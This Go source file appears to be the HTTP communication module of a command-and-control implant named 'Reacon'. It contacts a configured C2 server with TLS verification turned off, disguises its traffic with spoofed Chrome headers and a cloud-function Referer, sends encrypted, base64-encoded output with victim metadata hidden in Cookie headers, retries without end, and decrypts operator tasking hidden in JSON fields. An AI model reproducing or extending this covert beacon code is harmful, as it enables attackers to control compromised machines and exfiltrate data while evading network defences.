package communication

import (
	"Reacon/pkg/config"
	"Reacon/pkg/encrypt"
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/imroc/req"
)

var (
	httpRequest = req.New()
	Host        = ""
)

func init() {
	httpRequest.SetTimeout(30 * time.Second)
	trans, _ := httpRequest.Client().Transport.(*http.Transport)

	c2tmp := strings.TrimRight(config.C2, " ")
	if strings.HasPrefix(c2tmp, "http://") {
		Host = strings.TrimPrefix(c2tmp, "http://")
	} else if strings.HasPrefix(c2tmp, "https://") {
		Host = strings.TrimPrefix(c2tmp, "https://")
	}

	//url_i := url.URL{}
	//url_proxy, _ := url_i.Parse("http://127.0.0.1:8080")
	//trans.Proxy = http.ProxyURL(url_proxy)

	trans.MaxIdleConns = 20
	trans.TLSHandshakeTimeout = 30 * time.Second
	trans.DisableKeepAlives = true
	trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
}

var HttpHeaders = req.Header{
	"Host":             Host,
	"User-Agent":       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Server":           "nginx",
	"Accept":           "application/json, text/javascript, image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
	"Content-Type":     "text/html;charset=UTF-8",
	"Sec-Ch-Ua":        "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
	"Sec-Ch-Ua-Mobile": "?0",
	"Sec-Fetch-Site":   "same-site",
	"Sec-Fetch-Mode":   "no-cors",
	"Sec-Fetch-Dest":   "image",
	"Referer":          "https://gin-tne-fahcesmukw.cn-hangzhou.fcapp.run/",
	"Accept-Encoding":  "gzip, deflate",
	"Accept-Language":  "zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7",
	"Priority":         "u=1, i",
	"Connection":       "close",
}

func HttpPost(Url string, data []byte, encryptedMetaInfo []byte) ([]byte, error) {
	var resp *req.Resp
	var err error
	var idHeader req.Header
	data, _ = encrypt.Encrypt(data)
	data, _ = encrypt.EncodeBase64(data)

	Url = Url + "?"
	idHeader = req.Header{"Cookie": config.Http_get_metadata_prepend + string(encryptedMetaInfo)}
	for {
		//Data := req.Header{config.Http_post_client_output_type_value: string(data)}
		resp, err = httpRequest.Post(Url, data, HttpHeaders, idHeader)

		if err != nil {
			//fmt.Printf("!error: %v\n",err)
			fmt.Printf("post connect error!\n")
			time.Sleep(3000 * time.Millisecond)
			continue
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				//fmt.Println(resp.String())
				var jsonData ResData
				err := resp.ToJSON(&jsonData)
				if err != nil {
					return nil, err
				}
				return ParsePostResponse(jsonData)
			}
			break
		}
	}

	return nil, nil
}
func HttpGet(Url string, data []byte) ([]byte, error) {
	//metaData := req.Header{config.Http_get_metadata_header: config.Http_get_metadata_prepend + cookies}
	var resp *req.Resp
	var err error
	for {
		metaData := req.Header{"Cookie": config.Http_get_metadata_prepend + string(data)}
		resp, err = httpRequest.Get(Url, HttpHeaders, metaData)
		if err != nil {
			//fmt.Printf("!error: %v\n", err)
			fmt.Printf("get connect error!\n")
			time.Sleep(3000 * time.Millisecond)
			continue
			//panic(err)
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				//result, err := ParseGetResponse(resp.Bytes())
				//fmt.Println(resp.Bytes())
				//fmt.Println(string(resp.Bytes()))
				//test, _ :=ParseGetResponse(resp.Bytes(), cryptTypes)
				//fmt.Println(string(test))

				// 处理 控制端返回的内容
				var jsonData ResData
				err := resp.ToJSON(&jsonData)
				if err != nil {
					return nil, err
				}
				return ParseGetResponse(jsonData)
			}
			break
		}
	}
	return nil, nil
}

type ResData struct {
	Data data `json:"data"`
}
type data struct {
	LogID      string     `json:"log_id"`
	ActionRule actionRule `json:"action_rule"`
}
type actionRule struct {
	Pos1 []byte `json:"pos_1"`
	Pos2 []byte `json:"pos_2"`
	Pos3 []byte `json:"pos_3"`
}

func ParseGetResponse(resData ResData) (data []byte, err error) {
	if len(resData.Data.ActionRule.Pos2) > 0 {
		rawData, err := encrypt.DecodeBase64(resData.Data.ActionRule.Pos2)
		if err != nil {
			return nil, err
		}
		data, err = encrypt.Decrypt(rawData)
	}
	return data, err
}

func ParsePostResponse(resData ResData) (data []byte, err error) {
	if len(resData.Data.ActionRule.Pos3) > 0 {
		rawData, err := encrypt.DecodeBase64(resData.Data.ActionRule.Pos3)
		if err != nil {
			return nil, err
		}
		data, err = encrypt.Decrypt(rawData)
	}
	return data, err

	//var err error
	//data = bytes.TrimPrefix(data, []byte(config.Http_post_server_output_prepend))
	//data = bytes.TrimSuffix(data, []byte(config.Http_post_server_output_append))
	//data, err = encrypt.Decrypt(data)
	//return data, err
}
